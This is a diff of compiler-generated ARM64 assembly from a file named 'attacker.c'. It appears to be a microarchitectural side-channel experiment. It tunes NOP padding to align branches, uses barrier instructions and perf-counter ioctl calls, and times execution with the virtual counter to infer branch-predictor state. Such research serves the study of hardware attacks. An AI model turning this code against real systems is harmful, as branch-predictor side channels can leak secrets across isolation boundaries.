@@ -38,8 +38,8 @@ dummy1:
 .LFB35:
 	.cfi_startproc
 #APP
-// 44 "attacker.c" 1
-	.rept 149
+// 38 "attacker.c" 1
+	.rept 7926
 	nop
 	.endr
 	
@@ -86,8 +86,8 @@ outer:
 	str	x1, [sp, 168]
 	mov	x1, 0
 #APP
-// 52 "attacker.c" 1
-	.rept 9
+// 46 "attacker.c" 1
+	.rept 10
 	nop
 	.endr
 	
@@ -149,35 +149,28 @@ outer:
 	bl	perror
 .L8:
 #APP
-// 83 "attacker.c" 1
+// 77 "attacker.c" 1
 	isb
 // 0 "" 2
 #NO_APP
 	ldr	w0, [sp, 12]
 #APP
-// 86 "attacker.c" 1
-	.global branch1_eq_label  
-	.global branch1_else      
-	cmp    w0, #0      
-	branch1_eq_label:         
-	b.eq   branch1_else       
-	branch1_if:               
-	.rept 1                
-	nop                       
-	.endr                     
-	b     branch1_end         
-	branch1_else:             
-	.rept 1                
-	nop                       
-	.endr                     
-	nop                       
-	branch1_end:              
+// 80 "attacker.c" 1
+	.global branch1_eq_label      
+	cmp    w0, #0          
+	branch1_eq_label:             
+	b.eq   branch1_end            
+	branch1_if:                   
+	.rept 1                       
+	nop                           
+	.endr                         
+	branch1_end:                  
 	
 // 0 "" 2
-// 109 "attacker.c" 1
+// 98 "attacker.c" 1
 	dsb sy
 // 0 "" 2
-// 110 "attacker.c" 1
+// 99 "attacker.c" 1
 	isb
 // 0 "" 2
 #NO_APP
@@ -192,7 +185,7 @@ outer:
 	bl	perror
 .L9:
 #APP
-// 114 "attacker.c" 1
+// 103 "attacker.c" 1
 	isb
 // 0 "" 2
 #NO_APP
@@ -240,8 +233,26 @@ dummy2:
 .LFB37:
 	.cfi_startproc
 #APP
-// 129 "attacker.c" 1
-	.rept 110
+// 118 "attacker.c" 1
+	.rept 8000
+	nop
+	.endr
+	
+// 0 "" 2
+// 119 "attacker.c" 1
+	.rept 8000
+	nop
+	.endr
+	
+// 0 "" 2
+// 120 "attacker.c" 1
+	.rept 8000
+	nop
+	.endr
+	
+// 0 "" 2
+// 121 "attacker.c" 1
+	.rept 7884
 	nop
 	.endr
 	
@@ -271,8 +282,8 @@ inner:
 	str	x1, [sp, 168]
 	mov	x1, 0
 #APP
-// 138 "attacker.c" 1
-	.rept 9
+// 130 "attacker.c" 1
+	.rept 10
 	nop
 	.endr
 	
@@ -311,36 +322,24 @@ inner:
 	add	x0, x0, :lo12:.LC0
 	bl	perror
 	mov	x0, 0
-	b	.L21
+	b	.L19
 .L15:
 	mov	w2, 0
 	mov	x1, 9219
 	ldr	w0, [sp, 20]
 	bl	ioctl
-	cmn	w0, #1
-	bne	.L17
-	adrp	x0, .LC1
-	add	x0, x0, :lo12:.LC1
-	bl	perror
-.L17:
 	mov	w2, 0
 	mov	x1, 9216
 	ldr	w0, [sp, 20]
 	bl	ioctl
-	cmn	w0, #1
-	bne	.L18
-	adrp	x0, .LC2
-	add	x0, x0, :lo12:.LC2
-	bl	perror
-.L18:
 #APP
-// 169 "attacker.c" 1
+// 163 "attacker.c" 1
 	isb
 // 0 "" 2
 #NO_APP
 	ldr	w0, [sp, 12]
 #APP
-// 172 "attacker.c" 1
+// 166 "attacker.c" 1
 	.global branch2_eq_label  
 	.global branch2_else      
 	cmp    w0, #0      
@@ -359,10 +358,10 @@ inner:
 	branch2_end:              
 	
 // 0 "" 2
-// 195 "attacker.c" 1
+// 189 "attacker.c" 1
 	dsb sy
 // 0 "" 2
-// 196 "attacker.c" 1
+// 190 "attacker.c" 1
 	isb
 // 0 "" 2
 #NO_APP
@@ -371,11 +370,11 @@ inner:
 	ldr	w0, [sp, 20]
 	bl	ioctl
 	cmn	w0, #1
-	bne	.L19
+	bne	.L17
 	adrp	x0, .LC3
 	add	x0, x0, :lo12:.LC3
 	bl	perror
-.L19:
+.L17:
 	str	xzr, [sp, 24]
 	add	x0, sp, 24
 	mov	x2, 8
@@ -383,16 +382,16 @@ inner:
 	ldr	w0, [sp, 20]
 	bl	read
 	cmp	x0, 8
-	beq	.L20
+	beq	.L18
 	adrp	x0, .LC4
 	add	x0, x0, :lo12:.LC4
 	bl	perror
 	str	xzr, [sp, 24]
-.L20:
+.L18:
 	ldr	w0, [sp, 20]
 	bl	close
 	ldr	x0, [sp, 24]
-.L21:
+.L19:
 	mov	x1, x0
 	adrp	x0, :got:__stack_chk_guard
 	ldr	x0, [x0, :got_lo12:__stack_chk_guard]
@@ -400,9 +399,9 @@ inner:
 	ldr	x2, [x0]
 	subs	x3, x3, x2
 	mov	x2, 0
-	beq	.L22
+	beq	.L20
 	bl	__stack_chk_fail
-.L22:
+.L20:
 	mov	x0, x1
 	ldp	x29, x30, [sp, 176]
 	add	sp, sp, 192
@@ -457,7 +456,7 @@ main:
 	str	x1, [sp, 120]
 	mov	x1, 0
 #APP
-// 213 "attacker.c" 1
+// 207 "attacker.c" 1
 	ldr    x1, =branch1_eq_label
 	ldr    x0, =branch2_eq_label
 	
@@ -475,19 +474,23 @@ main:
 	adrp	x0, .LC6
 	add	x0, x0, :lo12:.LC6
 	bl	printf
+	adrp	x0, :got:stdout
+	ldr	x0, [x0, :got_lo12:stdout]
+	ldr	x0, [x0]
+	bl	fflush
 	mov	x0, 26624
 	movk	x0, 0x989, lsl 16
 	bl	malloc
 	str	x0, [sp, 32]
 	ldr	x0, [sp, 32]
 	cmp	x0, 0
-	bne	.L24
+	bne	.L22
 	adrp	x0, .LC7
 	add	x0, x0, :lo12:.LC7
 	bl	perror
 	mov	w0, 0
-	b	.L32
-.L24:
+	b	.L30
+.L22:
 	str	wzr, [sp]
 	adrp	x0, .LC8
 	add	x1, x0, :lo12:.LC8
@@ -499,27 +502,27 @@ main:
 	mov	x0, 34464
 	movk	x0, 0x1, lsl 16
 	str	x0, [sp, 48]
-.L29:
+.L27:
 	mov	x0, 34464
 	movk	x0, 0x1, lsl 16
 	bl	delay
 	mov	w0, 0
-	bl	outer
+	bl	inner
 	str	x0, [sp, 56]
 #APP
-// 245 "attacker.c" 1
+// 240 "attacker.c" 1
 	dsb sy
 // 0 "" 2
-// 246 "attacker.c" 1
+// 241 "attacker.c" 1
 	isb
 // 0 "" 2
-// 247 "attacker.c" 1
+// 242 "attacker.c" 1
 	mrs x0, cntvct_el0
 // 0 "" 2
 #NO_APP
 	str	x0, [sp, 64]
 #APP
-// 248 "attacker.c" 1
+// 243 "attacker.c" 1
 	isb
 // 0 "" 2
 #NO_APP
@@ -545,11 +548,11 @@ main:
 	ldr	x0, [sp, 72]
 	lsr	x0, x0, 63
 	str	x0, [sp, 80]
-	adrp	x0, .L26
-	add	x0, x0, :lo12:.L26
+	adrp	x0, .L24
+	add	x0, x0, :lo12:.L24
 	str	x0, [sp, 104]
-	adrp	x0, .L27
-	add	x0, x0, :lo12:.L27
+	adrp	x0, .L25
+	add	x0, x0, :lo12:.L25
 	str	x0, [sp, 112]
 	ldr	x0, [sp, 80]
 	lsl	x0, x0, 3
@@ -557,19 +560,19 @@ main:
 	ldr	x0, [x1, x0]
 	nop
 	br	x0
-.L27:
+.L25:
 	ldr	x0, [sp, 8]
 	add	x0, x0, 1
 	str	x0, [sp, 8]
-	b	.L29
-.L26:
+	b	.L27
+.L24:
 	ldr	x1, [sp, 8]
 	adrp	x0, .LC10
 	add	x0, x0, :lo12:.LC10
 	bl	printf
 	str	wzr, [sp, 4]
-	b	.L30
-.L31:
+	b	.L28
+.L29:
 	ldrsw	x0, [sp, 4]
 	lsl	x0, x0, 5
 	ldr	x1, [sp, 32]
@@ -588,11 +591,11 @@ main:
 	ldr	w0, [sp, 4]
 	add	w0, w0, 1
 	str	w0, [sp, 4]
-.L30:
+.L28:
 	ldr	w1, [sp, 4]
 	ldr	w0, [sp]
 	cmp	w1, w0
-	blt	.L31
+	blt	.L29
 	ldr	x0, [sp, 40]
 	bl	fclose
 	ldr	x0, [sp, 32]
@@ -601,7 +604,7 @@ main:
 	add	x0, x0, :lo12:.LC12
 	bl	puts
 	mov	w0, 0
-.L32:
+.L30:
 	mov	w1, w0
 	adrp	x0, :got:__stack_chk_guard
 	ldr	x0, [x0, :got_lo12:__stack_chk_guard]
@@ -609,9 +612,9 @@ main:
 	ldr	x2, [x0]
 	subs	x3, x3, x2
 	mov	x2, 0
-	beq	.L33
+	beq	.L31
 	bl	__stack_chk_fail
-.L33:
+.L31:
 	mov	w0, w1
 	ldp	x29, x30, [sp, 128]
 	add	sp, sp, 144
